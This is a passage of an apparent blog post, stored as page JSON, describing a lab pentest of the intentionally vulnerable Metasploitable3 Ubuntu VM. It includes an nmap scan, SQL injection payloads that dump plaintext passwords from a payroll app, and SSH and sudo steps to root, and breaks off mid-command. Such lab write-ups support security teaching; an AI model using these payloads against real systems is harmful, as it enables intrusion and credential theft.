{"componentChunkName":"component---src-templates-blog-post-js","path":"/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1/","result":{"data":{"site":{"siteMetadata":{"title":"Thomas Laurenson"}},"markdownRemark":{"id":"ff31b458-54da-5325-8181-9da709962911","excerpt":"This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series: Part 1: Building the Ubuntu Linux…","html":"<p>This post is part of a series on the Ubuntu Linux version of Metasploitable3. The following posts are part of the series:</p>\n<ul>\n<li>Part 1: <a href=\"/blog/2018-07-03/metasploitable3-building-the-ubuntu-linux-version/\">Building the Ubuntu Linux Version</a></li>\n<li>Part 2: <a href=\"/blog/2018-07-04-metasploitable3-customizing-the-ubuntu-linux-version\">Customizing the Ubuntu Linux Version</a></li>\n<li>Part 3: <a href=\"/blog/2018-07-08/metasploitable3-pentesting-the-ubuntu-linux-version-part1\">Pentesting the Ubuntu Linux Version - SQL Injection</a></li>\n<li>Part 4: <a href=\"/blog/2018-07-09/metasploitable3-pentesting-the-ubuntu-linux-version-part2\">Pentesting the Ubuntu Linux Version - Attacking Services</a> (You are here!)</li>\n</ul>\n<h2 id=\"contents\" style=\"position:relative;\"><a href=\"#contents\" aria-label=\"contents permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Contents</h2>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#introduction\">Introduction</a></p>\n<ul>\n<li><a href=\"#overview-of-flags\">Overview of Flags</a></li>\n</ul>\n</li>\n<li><a href=\"#initial-assessment\">Initial Assessment</a></li>\n<li><a href=\"#port-80-payroll-web-application\">Port 80: Payroll Web Application</a></li>\n<li><a href=\"#reviewing-the-payroll-app-source-code\">Reviewing the Payroll App Source Code</a></li>\n<li><a href=\"#conclusion\">Conclusion</a></li>\n</ul>\n</div>\n<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>My previous two posts covered <a href=\"/blog/2018/07/03/metasploitable3-building-the-ubuntu-linux-version/\">Building Metasploitable3</a> and then <a href=\"/blog/2018/07-04-metasploitable3-customizing-the-ubuntu-linux-version\">Customizing Metasploitable3</a>  where I specified the steps required to build and customize the Metasploitable3 Ubuntu Linux version. In this post, we wrap up this series of posts by performing a pentest, or security audit, on the default Metasploitable3 Ubuntu Linux system. </p>\n<h4 id=\"basic-configuration-target-system\" style=\"position:relative;\"><a href=\"#basic-configuration-target-system\" aria-label=\"basic configuration target system permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Basic Configuration: Target System</h4>\n<p>The default Metasploitable3 Ubuntu Linux version was used as the target. The default <code class=\"language-text\">ubuntu_14.04.json</code> Packer template was used to build the virtual machine, and no modifications to the default configuration were made. The virtual machine was hosted in VMWare Workstation. The network configuration was set to <em>Host-Only</em> and the IP address was set to: <code class=\"language-text\">192.168.19.20</code>.</p>\n<h4 id=\"basic-configuration-attack-system\" style=\"position:relative;\"><a href=\"#basic-configuration-attack-system\" aria-label=\"basic configuration attack system permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Basic Configuration: Attack System</h4>\n<p>Kali Linux version 2018.2 was used as the attack system. The virtual machine used was downloaded from <a href=\"https://images.offensive-security.com/virtual-images/kali-linux-2018.2-vm-amd64.zip\">Offensive Security</a>. The only modifications to the system were that an update was performed. Again, the network configuration was set to <em>Host-Only</em> and the IP address was set to: <code class=\"language-text\">192.168.19.10</code>.</p>\n<h3 id=\"overview-of-flags\" style=\"position:relative;\"><a href=\"#overview-of-flags\" aria-label=\"overview of flags permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Overview of Flags</h3>\n<p>According to the <code class=\"language-text\">flags.rb</code> Chef <em>recipe</em> in the metasploitable <em>cookbook</em>, there are a total of 10 flags in the default metasploitable3 Ubuntu Linux version. They are listed below for reference:</p>\n<ul>\n<li>10 of Clubs (no difficulty specified)</li>\n<li>7 of Diamonds (no difficulty specified)</li>\n<li>10 of Spades (easy)</li>\n<li>8 of Clubs (easy)</li>\n<li>3 of Hearts (easy)</li>\n<li>9 of Diamonds (easy)</li>\n<li>5 of Diamonds (hard)</li>\n<li>2 of Spades (hard)</li>\n<li>8 of Hearts (hard)</li>\n<li>Joker red (hard)</li>\n</ul>\n<p>The difficulty rating is gained from the flags <em>recipe</em> used when building the virtual machine. The listing is only for reference, and finding the flags is not the goal of this post. However, leave a comment if you are interested, and I could investigate this in the future.</p>\n<h2 id=\"initial-assessment\" style=\"position:relative;\"><a href=\"#initial-assessment\" aria-label=\"initial assessment permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Initial Assessment</h2>\n<p>As usual, starting with a port scan seems like a logical first step. The results of a basic service scan are displayed below:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">root@kali:~# nmap -sV -Pn -T4 -p 1-65535 -oX metasploitable3.xml 192.168.19.20\nStarting Nmap 7.70 ( https://nmap.org ) at 2018-07-04 17:50 EDT\nNmap scan report for 192.168.19.20\nHost is up (0.00032s latency).\nNot shown: 65525 filtered ports\nPORT     STATE  SERVICE     VERSION\n21/tcp   open   ftp         ProFTPD 1.3.5\n22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n80/tcp   open   http        Apache httpd 2.4.7\n445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n631/tcp  open   ipp         CUPS 1.7\n3000/tcp closed ppp\n3306/tcp open   mysql       MySQL (unauthorized)\n3500/tcp open   http        WEBrick httpd 1.3.1 (Ruby 2.3.7 (2018-03-28))\n6697/tcp open   irc         UnrealIRCd\n8181/tcp open   http        WEBrick httpd 1.3.1 (Ruby 2.3.7 (2018-03-28))\nMAC Address: 00:0C:29:00:43:58 (VMware)\nService Info: Hosts: 127.0.0.1, METASPLOITABLE3-UB1404, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 112.18 seconds</code></pre></div>\n<p>The port scan revealed a number of open ports running interesting services. Maybe I have been doing too much web application security, but port 80 and 8181 peaked my interest. Same with port 6697, running UnrealIRCd - which I remember exploiting on Metasploitable2. Ports 21 and 22 were also of interest. </p>\n<h2 id=\"port-80-payroll-web-application\" style=\"position:relative;\"><a href=\"#port-80-payroll-web-application\" aria-label=\"port 80 payroll web application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Port 80: Payroll Web Application</h2>\n<p>Checking out port 80 using Firefox in Kali Linux revealed directory listing containing a number of entries. The entries are displayed in the figure below:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/9ef3e7f39a223d1e503690b2d2409fbd/7762d/port80.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 78.48101265822784%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACX0lEQVQ4y6VUa3OiQBDk//+oiyn1EqPnCx9EK4qAgCA+QDBnCZ3pVcydfrq6reqacXe2t+eB2vl8xuFwQJIkYhPll0jT9MGnvcRe7pQ4Ho8oigKa7/sYDAZ4f5/AMAyMx2NlR6MR6vU6Go2GQqVSQa1WQ7PZxGQykfh39Pt9VKtVtU+QVLNtWwXxEonLYEPQ7XbRarWg67q6TEsMh0MFxhP0O52OUqo5joPWrzZms5lSx8PJdIogCBBFkbJhGMJ1Pcznc5imCcuy1P5qtVLZ9Ho9JYjl0Ja2iWHzGUNJkWm2RO1PkU8lDKQyqqQC/qZP5fzdbreV5T3GK4W+50LvNFWwrkvKUstupw3WNoo2WK+jGzab7dXfXM/WsrdRDfI8D3EcQwuCEC+vDTw9VeTFN0l9gp6oOp0+8S9rv9+XhMFtU0oiyi7+bgepVYGPj1xSyuWskMdyLBa57J2leWfpaiGRuYrfbrffhLGwZ1mG5TKF46T4/Myk6AdpQiJNOAjRQR5KYduMyWQvE+JM4khWXAXsroQrH2b/BX39N+LkOwXHsQSmELti56Igup6cr6ouZBzmB8K35x8wBgnm0wxZnCGORI1lw5IZ9Txf1FiqAbG8mOckwR+4Jwx8dF/rMPQEH0aKQTuBK2k6ji1EC3DwCXadZblfD4Sh1NA1Z5ibW1EUw1zsEK53oigUkpUaXoLDzU5yTNgA4nQ63Qj/akoos7Xfb2TSY+lcosj4IgnKPwH6vFTu05ZkXCTjvsbPy3VdUREoRRdVwU0ZUy39e/CMA03LT5gl0fI8V8z/C37HXF+pXKfzJ5p5NAAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Directory listing of Apache on port 80\"\n        title=\"Directory listing of Apache on port 80\"\n        src=\"/static/9ef3e7f39a223d1e503690b2d2409fbd/f058b/port80.png\"\n        srcset=\"/static/9ef3e7f39a223d1e503690b2d2409fbd/c26ae/port80.png 158w,\n/static/9ef3e7f39a223d1e503690b2d2409fbd/6bdcf/port80.png 315w,\n/static/9ef3e7f39a223d1e503690b2d2409fbd/f058b/port80.png 630w,\n/static/9ef3e7f39a223d1e503690b2d2409fbd/7762d/port80.png 649w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>The first item of interest was <code class=\"language-text\">payroll_app.php</code>. This file loaded a <em>Payroll Login</em> system. The <code class=\"language-text\">nmap</code> output had identified a MySQL server running on Metasploitable3. Instantly, an SQL injection attack came to mind. So I started with the classic <code class=\"language-text\">' OR 1=1#</code>. </p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/1cb5bf8053962b65a44b4c8cbce50980/ae6b7/webapp_port80.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 75.9493670886076%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAPCAYAAADkmO9VAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABxUlEQVQ4y52S6YoiQRCEff9XGtj9ISgrtt3e2t7ifeN9x/aXQw09szIDmxB0WUZGRmZl4vl8arPZaLFYvMRkMtFoNDJMp1O7m8/n9p3NZhqPxxoOh1oulyISp9NJxWJRpXI5+pZUqVRUjs6lEueqMpmMksmkUqmUgiBQvV5XtVpVrVazPO5BOp3W7XZT4ng8yvNy8n1fQYRCoWBnz/NMnEKIhGFoQk6MO2CcqDjFzufzu2A2m1UYkVrhe3Uqk9Rut9VqtdTpdDQYDNWMztz1er2PUcBDDAOXyyUSPF1U+fNLBd+TH+Tl53L6/famXPSlunOA8zByRDIdADj5fF7NZtOMmMPD4WBDfjweul6vhvv9bgPudrvmjtZwReJgMLD/mJfj87A8EN2a4Gq1VjywTjUEcMYjIUxbjUbjQ4hAjOCVY4KrT2KsxH6/NxeQOAM2Av56vTYBJ0qQ81IQZ5AhEOwZLdM+o3E7iChcF986JIlZAZbZFYgDQbg/CtIWZETj9y7czLbbrXF/FGQuzgHY7Xb/gHmSw4xfCpIYD9aGdtxrvwJrFo9Pgl/3kMqIfof4HpLLHjKCBD94SRa33+//F8jl8ZjvXyPAZeHNEmryAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Payroll web application running on Apache on port 80\"\n        title=\"Payroll web application running on Apache on port 80\"\n        src=\"/static/1cb5bf8053962b65a44b4c8cbce50980/f058b/webapp_port80.png\"\n        srcset=\"/static/1cb5bf8053962b65a44b4c8cbce50980/c26ae/webapp_port80.png 158w,\n/static/1cb5bf8053962b65a44b4c8cbce50980/6bdcf/webapp_port80.png 315w,\n/static/1cb5bf8053962b65a44b4c8cbce50980/f058b/webapp_port80.png 630w,\n/static/1cb5bf8053962b65a44b4c8cbce50980/ae6b7/webapp_port80.png 655w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>After entering the SQL injection attack in the <em>User</em> input box, I hit <em>OK</em>. Seems like no password was required to be entered. The SQL injection revealed a total of 15 users in the Payroll App. It seems like the is some terrible handling of user input that constructs the SQL statements. String concatenation no doubt! The output of the SQL injection attack is displayed below:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 575px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/ccc2a4390e2bafa77f2abe04f3a0833b/59415/webapp_port80_users.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 163.9240506329114%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAhCAYAAADZPosTAAAACXBIWXMAAAsTAAALEwEAmpwYAAADBUlEQVRIx23Wh24EIQwE0P3/70vvvddLr0QPaZA3CRK3C7iM7TF70/f3d8v8+vpqxtraWlteXm77+/ttY2Oj3d7etuPj47a0tNROT0/73Nra6rJV35zaP+Pw8LCtrq623d3dbuTq6qpdX1934+fn5+3s7Kzt7e39p9qm19fXdnNz0+7u7sZ8enoa0/nDw0N7fHxsz8/P/Zl3yM37+/v+fHl5aRPv7+/vXXmxWAzlt7e3vseBPWcUIscIo/a8e7I1sWxY7OzstPX19R6WQXFzc7OHJ6+fn5/9zJrcxcVFj2BlZaW/k58ggIY33j0zGKhrAxKIRRUZCA22JguWJf3k5KTnsypfXl6OChoiOjo66sgiY+28G/Tj0JNhCt6Nj4+P/g5FRvKX3KMapzOEvEBmylE1CLlnNcgYOfsMWs8MygkvOciQ03hPyByQz4AS6RkeISf5yUuU7UNf98gwUmXQLPkdRcF+RTFrUbRfHBlC1XppUwzRWaJhqyN0yAtFApU2QRNEoVelTVIwQnYIoXxV2tTQ8iSPJogchIlqVuVQJvlIvkLaGHTOaSoPoWIyPAwKQ/Uc1ArmAviNELqkhmF5TU/3kC0YtGEdZUrSkEqHh5xUGen6E3I6JCEmhxylADXkKvOnU4SWPhbOwcFBR0L4d39zIEQy0MkhGs16WR4YQAc59LRHOPdgzWtk0M2c0YYCBLyggzaqykib3jacV/Jjwvb29rjGBrEd2ITMFIJ1wqo5qzJ0g3bk0IROcrUaVOkSuaqFUjx75OLQDT5rvdyHNtKjCUc6QhGDTO1tRgGZETs8lE8GK8eQvd6HClANOstlO7sPkTMfmnrb2K+oKdciMS5FCjhCZh1hGa63jff0dr1tKtHrZ2KGkJfwLYiCMDeLIV+KEllOrWdFSfzg17uP90riGIAyVCKTYg6EFBAWuStFoAjhIau5/J3DWevlrwgDqbKZ3KbF7CWHkYHwzzdFWBq+XgIpQK6mDPms/ybyTRm9LBRC6JDvbaaz3C6Z1vazppvvufcfv9P2l5tGU80AAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Payroll web application users\"\n        title=\"Payroll web application users\"\n        src=\"/static/ccc2a4390e2bafa77f2abe04f3a0833b/59415/webapp_port80_users.png\"\n        srcset=\"/static/ccc2a4390e2bafa77f2abe04f3a0833b/c26ae/webapp_port80_users.png 158w,\n/static/ccc2a4390e2bafa77f2abe04f3a0833b/6bdcf/webapp_port80_users.png 315w,\n/static/ccc2a4390e2bafa77f2abe04f3a0833b/59415/webapp_port80_users.png 575w\"\n        sizes=\"(max-width: 575px) 100vw, 575px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Instantly it is obvious that the web application requires four properties must be returned: Username, First Name, Last Name, and Salary. This information is based on the fact that the webpage displays a table that has these four columns. We already know that there is a database on the server, <code class=\"language-text\">nmap</code> reported that MySQL was running on the default port 3306. Next step: determine the MySQL version that installed. The next step was to execute the following SQL injection attack:</p>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\">' <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>@<span class=\"token variable\">@version</span><span class=\"token comment\">#</span></code></pre></div>\n<p>This revealed that the following MySQL version was running: <code class=\"language-text\">5.5.60-0ubuntu0.14.04.1</code>. Just as a quick summary, the above SQL injection uses the <code class=\"language-text\">UNION</code> statement, which simply provides the ability to execute two SQL statements. The two at symbols (<code class=\"language-text\">@@</code>) refer to a global variable available in SQL, and the <code class=\"language-text\">version</code> command will dump the SQL database version for us. The three <code class=\"language-text\">null</code> entries are because the web application wants to print four columns in a table. Using <code class=\"language-text\">null</code> means the web application should print an empty entry in the first three columns.</p>\n<p>From here it is only too easy. One can guess that each of the users in the database must have a password. We already know the username, as that information was gathered in the first SQL injection attack. Furthermore, it can be assumed that we are querying a table of user information, most likely called <code class=\"language-text\">users</code>. This table will most likely have passwords in it too - this is how a user will be able to login to the Payroll App. Putting all this information together, we can attempt to dump the password information using the following SQL injection attack:</p>\n<div class=\"gatsby-highlight\" data-language=\"sql\"><pre class=\"language-sql\"><code class=\"language-sql\">' <span class=\"token operator\">OR</span> <span class=\"token number\">1</span><span class=\"token operator\">=</span><span class=\"token number\">1</span> <span class=\"token keyword\">UNION</span> <span class=\"token keyword\">SELECT</span> <span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">null</span><span class=\"token punctuation\">,</span>username<span class=\"token punctuation\">,</span>password <span class=\"token keyword\">FROM</span> users<span class=\"token comment\">#</span></code></pre></div>\n<p>Again, we can utilize <code class=\"language-text\">null</code> to print nothing in the first two columns. Without this addition, the web application will fail to load correctly. Looks like we got lucky:</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 630px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/5121f82782fd2b3a30f707ba8788fc9e/321ea/webapp_port80_passwords.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 50.632911392405056%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAKCAYAAAC0VX7mAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAA6ElEQVQoz42SBwrEMAwE7/8/Te+9+BjBGvkCRwSJI2FNVmt/mqYJXdeFtm2D4jiOUBRF2LbNcr7Zo1jX1WrXdVl+37etsD6AxnEMWZaFeZ4TYFmW4TzP2KTGZVmiAF83IK9pmmwDIGLfd1NEjgoAapJCRCgeQJT1fR9HADgMg31TA45Sr5Aaua9HoA+vROPwszzPbRUQO6qqSrxMgBQF875IYV3X5jMHxcj0YRNg6uxJgF6ZzwWkGSsIoKjjoaaxXwFZOQA81YkD1HXTuI+R/wFRh1feQzyl7q16DUQdAEC6NvjGdfu9Nl9XEw1XnaaoUQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Payroll web application user passwords\"\n        title=\"Payroll web application user passwords\"\n        src=\"/static/5121f82782fd2b3a30f707ba8788fc9e/f058b/webapp_port80_passwords.png\"\n        srcset=\"/static/5121f82782fd2b3a30f707ba8788fc9e/c26ae/webapp_port80_passwords.png 158w,\n/static/5121f82782fd2b3a30f707ba8788fc9e/6bdcf/webapp_port80_passwords.png 315w,\n/static/5121f82782fd2b3a30f707ba8788fc9e/f058b/webapp_port80_passwords.png 630w,\n/static/5121f82782fd2b3a30f707ba8788fc9e/321ea/webapp_port80_passwords.png 786w\"\n        sizes=\"(max-width: 630px) 100vw, 630px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>In the above figure, we can see the bottom of the first SQL query results. This is the same as the first SQL injection attack (<code class=\"language-text\">' OR 1=1#</code>). Following that, the last two columns display the username and password, <strong>in plaintext</strong>, for each of the 15 users. </p>\n<p>I was hoping that the user credentials dumped from the MySQL database were not the same credentials used for system authentication… turns out they are! A quick SSH test to Metasploitable3 gained access as the user: <code class=\"language-text\">leia_organa</code> using the password: <code class=\"language-text\">help_me_obiwan</code>.</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">root@kali:~# ssh leia_organa@192.168.19.20 \nThe authenticity of host '192.168.19.20 (192.168.19.20)' can't be established.\nECDSA key fingerprint is SHA256:qvGI7uYbIIalZ0vugejoVujPrAEtQ3d8nvs2K+DMLBc.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added '192.168.19.20' (ECDSA) to the list of known hosts.\nleia_organa@192.168.19.20's password: \nWelcome to Ubuntu 14.04.1 LTS (GNU/Linux 3.13.0-32-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com/\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nleia_organa@metasploitable3-ub1404:~$ </code></pre></div>\n<p>A quick check of the available groups indicated that sudo access was achieved. </p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">leia_organa@metasploitable3-ub1404:~$ groups\nusers sudo</code></pre></div>\n<p>A simple check to gain root access:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">leia_organa@metasploitable3-ub1404:~$ sudo -s\n[sudo] password for leia_organa: \nroot@metasploitable3-ub1404:~# </code></pre></div>\n<p>Game over. I hadn’t even opened the Metasploit Framework yet and had full root access to the system! This really shows the power of SQL injection attacks against a poorly coded web application. It makes a great learning exercise, especially for those new to web application security and pentesting. I would like to think that such blatant security issues do not still exist in the wild… however, the <a href=\"https://www.owasp.org/index.php/Top_10-2017_Top_10\">OWASP Top 10-2017</a> still list injection vulnerabilities as the number 1 security issue in web applications.</p>\n<h2 id=\"reviewing-the-payroll-app-source-code\" style=\"position:relative;\"><a href=\"#reviewing-the-payroll-app-source-code\" aria-label=\"reviewing the payroll app source code permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Reviewing the Payroll App Source Code</h2>\n<p>Breaking the <em>Payroll App</em> was fun! However, it is prudent that we review the source code that leads to this. Instead of looking at the source from the build process, we shall investigate the source code from the running system. Firstly, the following command attempts to find any occurrences of the word <em>payroll</em> on the system:</p>\n<div class=\"gatsby-highlight\" data-language=\"none\"><pre class=\"language-none\"><code class=\"language-none\">leia_organa@metasploitable3-ub1404:~$ sudo find / -iname 